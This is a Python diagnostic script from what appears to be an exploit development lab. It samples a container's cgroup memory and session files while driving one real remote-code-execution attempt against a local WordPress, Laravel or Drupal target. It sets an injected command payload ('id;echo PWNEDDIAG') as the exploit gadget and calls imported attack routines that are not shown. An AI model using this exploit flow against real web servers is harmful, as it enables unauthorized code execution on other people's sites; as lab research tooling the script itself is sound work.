#!/usr/bin/env python3
"""Charge diagnosis of ONE real attempt against the WordPress target
(lab-side controller only - the exploit itself is pure HTTP).

Samples the container's cgroup every ~20ms during a real attempt:
  current  - total charge
  file     - page cache (the evictable "absorber" + session files)
  anon     - unreclaimable memory (fillers, serialisation)
  dirty    - unwritten page cache (the write's charge)
  oom/kill - memcg OOM events during the attempt

and prints the attempt's file state at the end. This is a DIAGNOSTIC
harness (docker exec / cgroup reads are fine here); the exploit itself
never touches any of it.

usage: wp_diagnose.py [port] [container] [h] [chain]

chain is "wordpress" (default), "laravel" or "drupal"; the
harness then reproduces that chain's exact attempt flow.
"""
from __future__ import annotations

import subprocess
import sys
import time

import lab
import remote

SAMPLES = 400


def main() -> int:
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8091
    if len(sys.argv) > 2:
        lab.CONTAINER = sys.argv[2]
    h = int(sys.argv[3]) if len(sys.argv) > 3 else 46_000_000
    chain = sys.argv[4] if len(sys.argv) > 4 else "wordpress"
    lab.set_geometry("big")
    lab.HOST, lab.PORT = "127.0.0.1", port
    sid = lab.sid_new()

    # Reproduce the chosen chain exactly as the exploit runs it:
    # the chain's own filler count (h // N per filler, each <=
    # F_MAX=7MiB) and its real gadget. Without this the harness can
    # push h // 4 = 14MiB per filler into a 7MiB Content-Length
    # field - the extra bytes never become pressure and the
    # measurement lies.
    if chain == "wordpress":
        lab.set_gadget("wordpress", "id;echo PWNEDDIAG")
        lab.wp_align_geometry()
        remote.ACTIVE_FILLERS = 8
    else:
        # laravel and drupal use the bio geometry (raw body value)
        lab.set_gadget(chain, "id;echo PWNEDDIAG")
        remote.ACTIVE_FILLERS = remote.N_FILLERS
    remote.OUT_MARKER = "PWNEDDIAG"

    # one docker exec sampling everything inside the container
    sh = (
        f"i=0; while [ $i -lt {SAMPLES} ]; do "
        "c=$(cat /sys/fs/cgroup/memory.current); "
        "f=$(awk '/^file /{print $2}' /sys/fs/cgroup/memory.stat); "
        "a=$(awk '/^anon /{print $2}' /sys/fs/cgroup/memory.stat); "
        "d=$(awk '/^dirty /{print $2}' /sys/fs/cgroup/memory.stat); "
        "e=$(awk '/^oom /{print $2}' /sys/fs/cgroup/memory.events); "
        "k=$(awk '/^oom_kill /{print $2}' /sys/fs/cgroup/memory.events); "
        # newest session file: chains with a fresh sid per attempt
        # (filecache/laravel/drupal) do not use the sid below
        "sf=$(ls -t /tmp/sess_* 2>/dev/null | head -1); "
        "s=$( [ -n \"$sf\" ] && wc -c < \"$sf\" || echo -1 ); "
        "echo \"$c $f $a $d $e $k $s\"; "
        "sleep 0.02; i=$((i+1)); done"
    )
    proc = subprocess.Popen(
        ["docker", "exec", lab.CONTAINER, "sh", "-c", sh],
        stdout=subprocess.PIPE, text=True)

    t0 = time.monotonic()
    print(f"PHASE attempt-start h={h}", flush=True)

    # drive the REAL attempt (two carriers, filler pressure, victim,
    # consumer) so the sample stream reflects the actual flow
    c_len = remote.P_START + lab.L1 + 2
    r_len = (len(lab.r_prefix()) + lab.LEN2 + len(lab.r_suffix())
             + lab.L1 + 17)
    res = remote.attempt("127.0.0.1", port, h, c_len, r_len, "id", sid)
    print(f"PHASE attempt-end t={time.monotonic() - t0:.2f}s "
          f"victim={res.get('victim')} drop_ms={res.get('drop_ms')} "
          f"hit={res.get('hit')} outcome={res.get('outcome')}", flush=True)

    out, _ = proc.communicate(timeout=SAMPLES * 0.02 + 15)

    rows = []
    for line in out.splitlines():
        parts = line.split()
        # columns: current file anon dirty oom kill sess_size
        if len(parts) >= 6 and all(x.lstrip("-").isdigit() for x in parts):
            vals = [int(x) for x in parts]
            while len(vals) < 7:
                vals.insert(3, 0)   # pad the missing dirty column
            rows.append(tuple(vals[:7]))
    if not rows:
        print("NO SAMPLES")
        return 1
    print(f"\n{'t':>6} {'current':>9} {'file':>9} {'anon':>9} "
          f"{'dirty':>9} {'oom':>5} {'kill':>4} {'sess':>10}")
    limit = subprocess.run(
        ["docker", "exec", lab.CONTAINER, "cat",
         "/sys/fs/cgroup/memory.max"],
        capture_output=True, text=True).stdout.strip()
    print(f"(memory.max = {int(limit) // 1048576 if limit.isdigit() else limit}M)")
    lo = min(r[0] for r in rows)
    hi = max(r[0] for r in rows)
    prev_sz = None
    for i, (c, f, a, d, e, k, sz) in enumerate(rows):
        # always print when the session file changes size (the write),
        # when an OOM event fires, plus every 10th sample
        sz_change = prev_sz is not None and sz != prev_sz
        prev_sz = sz
        if i % 10 == 0 or sz_change or e != (rows[i - 1][4] if i else e):
            mark = " <== peak" if c == hi else ""
            print(f"{i * 0.02:5.2f} {c / 1048576:8.1f}M {f / 1048576:8.1f}M "
                  f"{a / 1048576:8.1f}M {d / 1048576:8.1f}M "
                  f"{e:5} {k:4} sess={sz}{mark}")
    print(f"\nrange: {lo / 1048576:.1f}M .. {hi / 1048576:.1f}M; "
          f"file range: {min(r[1] for r in rows) / 1048576:.1f}M .. "
          f"{max(r[1] for r in rows) / 1048576:.1f}M; "
          f"anon range: {min(r[2] for r in rows) / 1048576:.1f}M .. "
          f"{max(r[2] for r in rows) / 1048576:.1f}M; "
          f"oom events: {rows[-1][4] - rows[0][4]}, "
          f"kills: {rows[-1][5] - rows[0][5]}")

    # Read the file FROM INSIDE THE CONTAINER: the wp service does not
    # mount ./sessions (only the bare/fpm targets do), so lab.sess_read's
    # host path does not exist here and would always report size=0.
    r = subprocess.run(
        ["docker", "exec", lab.CONTAINER, "sh", "-c",
         f"if [ -f /tmp/sess_{sid} ]; then wc -c < /tmp/sess_{sid}; "
         f"else echo MISSING; fi"],
        capture_output=True, text=True, timeout=30)
    out_size = r.stdout.strip()
    print(f"FILE(container): size={out_size}")
    if out_size.isdigit():
        rr = subprocess.run(
            ["docker", "exec", lab.CONTAINER, "cat", f"/tmp/sess_{sid}"],
            capture_output=True, timeout=60)
        verdict, k = lab.classify_file(rr.stdout, b"")
        print(f"FILE(container): bytes={len(rr.stdout)} "
              f"verdict={verdict} k={k}")
    # how many session files exist now, and how many are non-empty?
    rr = subprocess.run(
        ["docker", "exec", lab.CONTAINER, "sh", "-c",
         "ls /tmp/sess_* 2>/dev/null | wc -l; "
         "find /tmp -maxdepth 1 -name 'sess_*' -size +1k | wc -l"],
        capture_output=True, text=True, timeout=30)
    print(f"SESSIONS: total={rr.stdout.split()[0]} "
          f"nonempty={rr.stdout.split()[1]}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
